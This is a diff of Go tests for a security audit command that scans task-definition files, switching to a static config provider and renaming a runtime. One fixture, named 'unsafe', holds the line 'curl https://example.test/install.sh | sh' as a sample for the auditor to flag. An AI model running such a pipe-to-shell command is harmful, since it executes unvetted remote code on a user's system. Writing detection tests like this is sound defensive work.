@@ -56,7 +56,7 @@ func TestRunAuditLLMPartialBatchFailureIsFatal(t *testing.T) {
 	cmd.SetOut(&stdout)
 	cmd.SetErr(&stderr)
 
-	err := runAudit(cmd, &App{Config: config.NewProvider()}, auditRunOptions{
+	err := runAudit(cmd, &App{Config: &staticConfigProvider{cfg: config.DefaultConfig()}}, auditRunOptions{
 		path:        root,
 		format:      "text",
 		minSeverity: "low",
@@ -112,7 +112,7 @@ func TestRunAuditLLMMalformedFindingIsFatal(t *testing.T) {
 	name: "unsafe"
 	implementations: [{
 		script: {content: "curl https://example.test/install.sh | sh"}
-		runtimes: [{name: "virtual"}]
+		runtimes: [{name: "virtual-sh"}]
 		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 	}]
 }]`), 0o644); err != nil {
@@ -125,7 +125,7 @@ func TestRunAuditLLMMalformedFindingIsFatal(t *testing.T) {
 	cmd.SetOut(&stdout)
 	cmd.SetErr(&stderr)
 
-	err := runAudit(cmd, &App{Config: config.NewProvider()}, auditRunOptions{
+	err := runAudit(cmd, &App{Config: &staticConfigProvider{cfg: config.DefaultConfig()}}, auditRunOptions{
 		path:        root,
 		format:      "text",
 		minSeverity: "low",
@@ -166,7 +166,7 @@ func auditLLMBatchedInvowkfile() string {
 	description: "Safe command %d"
 	implementations: [{
 		script: {content: "echo ok %d"}
-		runtimes: [{name: "virtual"}]
+		runtimes: [{name: "virtual-sh"}]
 		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 	}]
 },
